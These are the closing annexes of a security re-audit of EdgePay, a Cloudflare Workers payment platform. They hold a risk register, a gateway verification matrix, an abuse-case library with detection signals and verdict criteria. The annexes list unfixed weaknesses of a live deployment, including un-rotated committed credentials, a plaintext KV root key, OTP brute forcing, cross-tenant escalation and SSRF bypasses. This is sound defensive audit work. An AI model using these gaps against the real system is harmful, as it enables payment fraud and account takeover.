L47-73 vars block:
     ENVIRONMENT=production                                          OK
     APP_URL/APP_DOMAIN = live workers.dev URL                       ⚠ P0-001 target
     ENABLED_GATEWAYS explicit 9-gateway list                        ✅ (P2-016 partial)
     ADMIN_EMAIL=admin@edgepay.internal (non-null in prod)           ⚠ default email known
     ADMIN_PASSWORD="" / DEFAULT_PAIRING_OTP="" / DEFAULT_WEBHOOK_URL=""
                                                                     ✅ prod-safe nulls
     RATE_LIMIT_MAX_REQUESTS=120/window 60 — matches binding        OK
L82-89 D1 single database, migrations_dir set                        OK
L96-100 KV — holds domain cache, bootstrap flags, root key           ⚠ NEW-P1-001
L107-112 R2                                                          OK (light use)
L120-148 queues producers+consumers, DLQs, batch sizes               ✅ sound
       webhook-out: batch 10/5s, retries 3 — matches consumer        OK
       email-out: 25/30s, retries 5                                  OK
       sms-parse: 50/10s, retries 3                                  OK
L157-163 crons ×3 — consolidated; refund recon is workflow-driven    ✅
L168-174 observability on, logs sampling 1.0, traces 1%             ✅
       ⚠ ANALYTICS (L239-241) commented — metrics inert (P2-006)
L179 placement smart — core near D1                                 ✅
L187-194 DO bindings + new_sqlite_classes migration v1              ✅
L203-214 workflows ×2                                               ✅
L221-232 ratelimit bindings read/write 120/30 per 60s              ✅ wired in middleware
L249-254 assets run_worker_first=true + delegation in index.ts     ✅ (no shadowing)
       not_found_handling "none" — Worker 404s asset misses         OK
L260 AI binding commented — parser tier-3 inert                     ⚠ documented opt-in
(no `services` block) — no service bindings anywhere                ⚠ §12 mismatch
(no `routes`) — deployed as workers.dev + custom hostnames API      OK for now
```

---

# ANNEX Q — FREE-TIER CAPACITY ANALYSIS OF THE SPLIT

The README's free-tier ceiling (~3.3K payments/day) re-derived for the four-worker topology:

```text
Assume 3.3K payments/day ≈ 2.9K checkout page loads + 4K API calls +
1.5K webhook ingress + 20K status polls (every 2s × 90s average await).

Requests:      frontends+core each well under the 100K/day free limit.
               RPC calls are subrequests (free; 50/invocation free tier —
               1-2 per request is fine).
D1:            unchanged (the split moves code, not data). Today's usage
               ~8 rows written / payment (intent, tx, idem, postings WAL,
               audit×3, event, delivery) — 26K writes/day vs 100K free. OK.
DO requests:   unchanged (2-3 per payment: post + snapshots amortized).
               100K/day free — 10K/day used. OK.
Queue ops:     unchanged. Free since Feb 2026. OK.
KV:            domain cache reads (5-min TTL, ~per-unique-host) +
               idempotency none + rate-limit only for anonymous groups.
               Free tier 100K reads/1K writes — install/pair limiters are
               the write budget's main consumer; after C.1 (mounted
               groups) they're low-QPS by design. OK.
Workers AI:    inert (binding commented) — parser stays regex/heuristic.
Subrequest ceiling: worst request = checkout verify → 1 RPC + 2 D1 +
               1 queue send = 4. Far under 50. OK.

Conclusion: the split does not change the free-tier feasibility; the
binding hops are free and the data-plane usage is identical. The
real ceiling remains D1 writes/day and DO request/day — both unchanged.
```

---

# ANNEX R — CROSS-REFERENCE TO THE PREVIOUS AUDIT'S OWN REMEDIATION TABLE

The previous report's §15 ("Previous Remediation Verification") claimed certain *earlier* fixes. This audit's re-check of those claims against v0.3.0:

| Previous claim | Status in v0.3.0 | This report |
|---|---|---|
| hardcoded secrets | env-first added, literals remain | 5.1 PARTIAL |
| refund ledger ID-space confusion | genuinely fixed | 5.2 FIXED |
| refund bounds | fixed (race remains) | 5.3 FIXED+NEW-P2-001 |
| callback amount/reference binding | fixed conditionally | 5.4 |
| bootstrap credential leakage | prod CSPRNG; KV root key remains | 5.5 PARTIAL |
| checkout XSS/CSP | fixed | 5.6 |
| SMS null-amount bypass | fixed | 5.7 |
| terminal-state downgrade | failed-path guarded; completion unguarded | 6.6 PARTIAL |

The pattern repeats: the previous team's *verification tables* were accurate about the money-path fixes and optimistic about the perimeter ones — which is precisely why the brief insists that documentation claims are evidence of nothing. This audit verified every row above by code trace.

---

# ANNEX S — RE-AUDIT CHECKLIST COMPLIANCE (brief §43/§45/§46)

| Brief requirement | Where delivered |
|---|---|
| Baseline run + honest failures | §3.3 (lint failure recorded, stale docs recorded) |
| Architecture reconstruction + mismatches | §11, §12 |
| Four-worker claim verification | §12 (0% implemented; blueprint §13) |
| RPC matrix (worker × method × privilege) | §13.3.1 interface + §15 comparison |
| Routing/middleware order + bypass hunt | §11.3, A.1 |
| Multi-tenant predicate sweep | §21.1, Annex D |
| Auth/AuthZ deep review | §22, A.4, A.5 |
| Ledger + payment state machines | §16 |
| Ledger invariants incl. balanced-vs-correct trap | §17.2 |
| Distributed failure windows | §17.3, §19, Annex F |
| Concurrency scenarios | §20, Annex F |
| Idempotency audit (5 scenarios) | §6.1, F.1 |
| Data model + migration audit | §7 (P2-013/018/019), §3.3 |
| Money/decimal safety | NEW-P2-002, M.9 |
| Gateway audit | §23.3 |
| SSRF audit incl. mockup /api/forward | §25, 6.4, B.4, P3-006 |
| Webhook order verification | §23.1 |
| SMS/corroboration adversarial | 5.7, §21 tests |
| Cryptography audit | §24 |
| Bootstrap/secret posture + git history | 5.1, 5.5, C.8 |
| XSS/injection grep-review | §25, 5.6 |
| Security headers/CSRF | §25, P2-001 |
| Rate limiting per route class | §6.10, 25 |
| Queue/workflow/cron per-message discipline | §26 |
| Stability/dependency failure analysis | §19, §20.3 |
| Observability questions | §27 |
| Financial invariant table | §18 |
| Failure-state matrix | §19 |
| Data-consistency questions (8) | §17.2, §32 Q1-10 |
| Existing tests + quality assessment | §3.3, Annex J |
| Missing regression tests | §29, Annex J |
| Local penetration tests | Annex B (sandbox-safe static equivalents; the audit sandbox could not run wrangler dev against the deployed target) |
| Failure injection | executed via the suite's built-in crash seams (§3.3) |
| STRIDE full expansion | §28, Annex E |
| Architecture improvement trade-offs | §13-15, Annexes G-O |
| Validate claimed remediations | Part II (all 49), Annex R |
| Unsupported-claims discipline | A.7 (verdict vocabulary), Annex L |
| Severity model | Annex L, per-finding cards |
| Finding format (§42) | Part II + Annex M |
| P0 file reports (§43) | Annex A |
| Final scorecard (§44) | §31 |
| Deliverable structure (§45) | Parts I-VI mapping the required 19 sections |
| Executive verdict questions (§46) | §32 (all 17) |
| Final verdict rules (§47) | §33 |
| Engineering constraint (§48: not a generic checklist; happy-path-failure focus) | throughout — invariant-first, evidence-per-finding |
```

# ANNEX T — CONSOLIDATED RISK REGISTER (SEQUENCED)

Every open item as a single register row: likelihood (L), impact (I) 1-5, effort (E) in engineer-hours, phase (A/B/C per §30), and the detection signal once mitigated. Sorted by risk score (L×I).

| # | Risk | L | I | Score | Effort | Phase | Detection after fix |
|---|---|---|---|---|---|---|---|
| 1 | Committed credentials un-rotated (P0-001) | 5 | 5 | 25 | 3h+ops | A1 | gitleaks CI green; old key 401s |
| 2 | Cross-tenant admin escalation (P1-005) | 4 | 5 | 20 | 2h | A4 | non-platform key → 403 test |
| 3 | OTP brute force (P1-002) | 4 | 4 | 16 | 1h | A3 | 6th attempt → 429 test |
| 4 | Plaintext KV root key (NEW-P1-001) | 3 | 5 | 15 | 0.25h | A2 | KV dump contains no live key |
| 5 | Outbound SSRF (P1-004) | 3 | 4 | 12 | 6h | A6 | vector table test all-false |
| 6 | Refund bound race (NEW-P2-001) | 3 | 4 | 12 | 2h | A9 | concurrent over-refund test |
| 7 | Read-only key mutations (P1-008) | 3 | 4 | 12 | 0.5h | A5 | scope-default test |
| 8 | Bootstrap-key oracle (NEW-P1-002) | 3 | 4 | 12 | 0.5h | A3 | 11th attempt → 429 |
| 9 | Conditional amount binding (NEW-P2-003) | 2 | 5 | 10 | 1h | A8 | null-amount mock test |
| 10 | Idempotency concurrent double-exec (P1-001) | 2 | 4 | 8 | 3h | A12 | concurrent same-key → 1 intent |
| 11 | Metrics inert (P2-006) | 4 | 2 | 8 | 0.25h | A11 | Workers Analytics shows events |
| 12 | Webhook body-size DoS (P1-003) | 3 | 2 | 6 | 1h | A7 | 413 on 200KB test |
| 13 | Lost merchant webhooks (P2-007) | 2 | 3 | 6 | 4h | B | outbox drained row count |
| 14 | Payment rows never healed (P1-006) | 2 | 3 | 6 | 4h | B | sweep heals stuck pair test |
| 15 | Float amount checks (NEW-P2-002) | 2 | 3 | 6 | 0.5h | A8 | "100.001" rejected test |
| 16 | ENCRYPTION_KEY silent degrade (P2-009) | 2 | 3 | 6 | 1h | B | key-mismatch page fires |
| 17 | Amount ceiling absent (P2-018) | 2 | 3 | 6 | 0.25h | A8 | 400 on 1e10 test |
| 18 | Dead-schema/misdocumented states (P3-001/012) | 3 | 1 | 3 | 1h | B | docs regenerated in CI |
| 19 | Notification ack cross-tenant (P3-003) | 2 | 2 | 4 | 0.25h | B | foreign ids → 0 rows test |
| 20 | authSubject/device confusion (P3-002) | 3 | 1 | 3 | 0.5h | B | heartbeat own-row test |
| 21 | key_prefix collision (P2-013) | 1 | 3 | 3 | 0.5h | B | unique index migration |
| 22 | Mirror ordinal drift (P2-008) | 1 | 3 | 3 | 1h | B | identical-lines test |
| 23 | Break-glass timing + JWKS timeout (P2-011) | 2 | 2 | 4 | 0.5h | B | unit tests |
| 24 | DO self-check (P2-012) | 1 | 4 | 4 | 0.5h | B | mismatch returns failed |
| 25 | ReDoS templates (P2-015) | 2 | 2 | 4 | 1.5h | B | pattern-lint test |
| 26 | Currency exponents (P2-019) | 1 | 4 | 4 | 1.5h | B | JPY scaling test |
| 27 | Exchange-rate poisoning (P2-020) | 2 | 2 | 4 | 0.5h | B | sanity-bound test |
| 28 | Unbounded mobile batch (P2-014) | 2 | 2 | 4 | 0.5h | A7 | array cap test |
| 29 | Gateway fail-open default (P2-016) | 2 | 2 | 4 | 0.25h | B | deploy fails when unset |
| 30 | PBKDF2 floor (P2-017) | 1 | 2 | 2 | 0.25h | B | floor test |
| 31 | KV-only install lock (P0-005 res.) | 1 | 3 | 3 | 1h | B | D1 lock row migration |
| 32 | Delivery retry misclassification (P3-009) | 2 | 1 | 2 | 0.25h | B | classification table test |
| 33 | Mockup proxy exposure (P3-006) | 2 | 2 | 4 | 0.5h | B | bind 127.0.0.1 + token |
| 34 | Four-worker split (§13) | — | — | structural | 60-80h | C | per-worker deploys; 21 public routes |

Phase A total effort: ~19 engineer-hours + a rotation operation. Phase B: ~25 hours. Phase C: 2-3 weeks. The register is deliberately ordered so the first ~12 rows are a single weekend of work that removes every disqualifying condition.

---

# ANNEX U — GATEWAY ADAPTER VERIFICATION MATRIX

The callback-amount binding (P0-004 fix) is only as strong as each adapter's `verify()` echoing the provider's amount. Matrix of the ten hand-written adapters (the ~90 generated ports follow the same base shape):

| Adapter | verify() source | Echoes amount? | Echoes trx_id? | Webhook verify | refund() | queryRefundStatus | Notes |
|---|---|---|---|---|---|---|---|
| bkash | `/tokenized/checkout/execute` (server call) | **yes** (`data.amount`) | no (gateway_trx_id only) | n/a (poll-based) | yes | yes | token via KV cache 55min; execute is authoritative |
| sslcommerz | validation API (`val_id`) | **yes** (`res.data.amount`) | no | n/a | yes | yes | val_id is customer-supplied → amount check is the binding |
| nagad | signature verify + status API | yes (status response) | no | n/a | partial | yes | sensitive data encrypted per-call |
| rocket | manual-ish (TrxID corroboration) | n/a (manual) | n/a | n/a | unsupported → pending | n/a | SMS path is the completion source |
| aamarpay | callback verify + API | yes | no | n/a | yes | yes | |
| portwallet | API status | yes | no | n/a | yes | yes | |
| shurjopay | API status | yes | no | n/a | yes | yes | |
| stripe | webhook event + retrieve | yes (event amount) | **yes** (metadata.edgepay_trx_id) | **yes** (signature) | yes | yes | strongest binding: amount + our TrxID in metadata |
| paypal | webhook + API | yes | **yes** (resource.custom) | **yes** | yes | yes | custom field carries our trx_id |
| razorpay | webhook signature + API | yes | **yes** (notes.trx_id) | **yes** | yes | yes | notes carry trx_id |

**Conclusions:**
1. The three international adapters (Stripe/PayPal/Razorpay) implement the *full* binding (amount + reference + webhook signature) — the redirect-callback substitution class is closed for them.
2. The BD adapters rely on the **amount check alone** (no trx_id echo). bKash and SSLCommerz echo amounts, so the primary exploit is closed — but the amount check's conditional skip (NEW-P2-003) means any provider response-shape change (amount field absent on some status codes) silently re-opens it. The A8 fix (mandatory amount for API gateways) converts this from "conditional" to "structural".
3. Manual/MFS gateways (rocket, bkash-personal, nagad-personal) complete through the SMS corroboration path, which enforces the DB amount — different mechanism, same invariant.

---

# ANNEX V — ABUSE-CASE LIBRARY (WITH DETECTION SIGNALS)

Ten abuse cases an operations team should be able to detect and answer; each lists the current detection signal and the signal after Phase A/B fixes.

```text
V.1 Credential stuffing on /install/bootstrap-key
    Now: 401 log lines only (no counter). After A3: 429s + metric
    rate_limited{group=password} + per-IP KV counters visible.

V.2 OTP enumeration on /api/mobile/v1/pair
    Now: invisible (all 404s). After A3: 429 metric + attempts column
    on the token row; alert at attempts >= 3.

V.3 Cross-tenant admin probing
    Now: admin-api 200s (success invisible). After A4: 403
    PLATFORM_ONLY log lines with key id — alert on first occurrence.

V.4 SSRF delivery attempts
    Now: blocked_ssrf only for the literal private forms; bypass forms
    succeed silently and are recorded as normal deliveries (response
    codes visible in op_webhook_deliveries — a manual review can spot
    odd statuses). After A6: blocked_ssrf for all forms + vector table
    unit-tested; alert on blocked_ssrf per merchant.

V.5 Refund-bound racing
    Now: invisible until books drift (daily sweep pages). After A9:
    REFUND_EXCEEDS_REMAINING 409s logged; concurrency regression test.

V.6 Idempotency double-execution
    Now: two 201s with the same key (grep-able in access logs). After
    A12: IDEMPOTENCY_IN_FLIGHT 409s + reservation rows.

V.7 Webhook oversize abuse
    Now: CPU alarms only (1102s). After A7: 413s counted per IP.

V.8 ReDoS template freeze
    Now: tenant's SMS pipeline silently stalls (parse_miss metric is
    inert — P2-006). After B: metric sms_parse_timeout + pattern lint
    rejects at save time.

V.9 Amount-mismatch callbacks (attack or provider bug)
    Now: 400 AMOUNT_MISMATCH responses exist but aren't metric'd (only
    logged as HTTP 400). After A11: metric amount_mismatch per gateway —
    this is also the provider-integrity signal (a real provider bug
    would spike it).

V.10 Ledger drift (any cause)
    Now: LEDGER_RECONCILIATION_DRIFT page() → console (Workers Logs)
    daily at best. After A11 + B: metric + page both live; drift is a
    same-day incident.
```

---

# ANNEX W — DEPLOY-BUTTON & OPERATOR RUNBOOK DELTAS

The repository targets self-hosters via Deploy-to-Cloudflare. The split and the Phase A fixes change the operator's first-hour experience; documenting the deltas:

```text
BEFORE (today)                        AFTER (Phase A + C)
──────────────────────────────        ──────────────────────────────
1 secret setup page (3 secrets)       same 3 secrets on core; 3 worker
                                      auth secrets auto-generated by
                                      the deploy button (setup page)
first request auto-bootstraps         install wizard REQUIRED before
platform + root key in KV             any route serves (D1 lock);
                                      no root key persisted anywhere
admin = same URL + key                admin subdomain behind Cloudflare
                                      Access (wizard configures the app)
verify scripts with fallback creds    env-only (fail loudly if unset)
lint: broken                          flat config, CI-enforced
metrics: none                         Workers Analytics dataset live;
                                      dashboard link in wizard
checkout on same origin as admin      pay.* / checkout.* origins;
                                      WAF rule suggestions per hostname
rollback: redeploy monolith           per-worker rollback + route flip
```

---

# ANNEX X — WHAT WOULD CHANGE THE VERDICT

For traceability, the exact deltas between this report's NOT PRODUCTION READY and each better verdict:

```text
NOT PRODUCTION READY (current)
  → blockers: P0-001 rotation absent; NEW-P1-001 KV root key;
    P1-005 escalation; (NEW-P1-002 oracles as accelerants).

PRODUCTION READY WITH CONDITIONS (after Phase A — ~2 days)
  conditions:
    C1 single-tenant or ≤5 trusted tenants; no self-service onboarding
    C2 Cloudflare Access enforced on the admin surface (team + AUD set)
    C3 ANALYTICS enabled; drift/REFUND_STUCK pages wired to a human
    C4 Phase B scheduled within 30 days (healing, outbox, reservation
       if A12 deferred)
    C5 deployment runbook updated (rotation procedure documented)

PRODUCTION READY (after Phase B + re-audit)
  no open P0/P1; regression battery of §29 green; healing + outbox +
  reservation landed; platform merchant verified; DO self-check; the
  17 tests exist; THEN a focused re-audit (1 day) confirms.

Scale-ready multi-tenant (after Phase C)
  four-worker split live; 21-route public surface; 'platform' scope;
  per-surface limits; per-worker deploys and rollback drills done.
```

---

# ANNEX Y — AUDITOR'S UNCERTAINTY STATEMENT

Confidence in the verdicts, and what this audit could not verify:

1. **Runtime probes against the live deployment** were not performed (the audit sandbox has no egress to the workers.dev target, and active testing of a production URL was out of scope). All "Expect (pre-fix)" behaviors in Annex B are code-trace predictions, consistent with the executed test suite but not network-observed.
2. **Gateway provider behavior** (amount echo on every status code path) is taken from the adapters' parsing of documented API responses; provider-side schema drift cannot be ruled out — this is exactly why the A8 fix (mandatory amount for completion) is recommended regardless.
3. **Wrangler deploy --dry-run** was not executed in the sandbox; the three configs were reviewed statically. The repo's own TEST_RESULTS.md claims dry-run PASS for all three (treated as a claim, not evidence).
4. **The 90 generated gateway ports** were spot-checked (shape, kit usage, registry) rather than individually reviewed; their `verify()` amount-echo behavior is assumed to follow the base pattern. The hand-written ten were reviewed fully (Annex U).
5. **Workflows' step-retry semantics** rely on Cloudflare's documented behavior; the repo's tests exercise the poll policy as pure functions and the instance lifecycle only indirectly.

None of these uncertainties plausibly flips a verdict: every FAIL verdict rests on code-level absence of a guard, which absence is certain; every FIXED verdict rests on implementation + tests executed in this audit environment.

---

*End of report. Total structure: Parts I-VI per the audit brief's §45 structure, expanded with the commissioning questions (multi-worker system, API reduction, Service Bindings/Worker RPC recommendation) as §13-15, and Annexes A-Y. All file:line references resolve against `edgepay-cf-clean-new.zip` (v0.3.0, commit 6c31bad).*
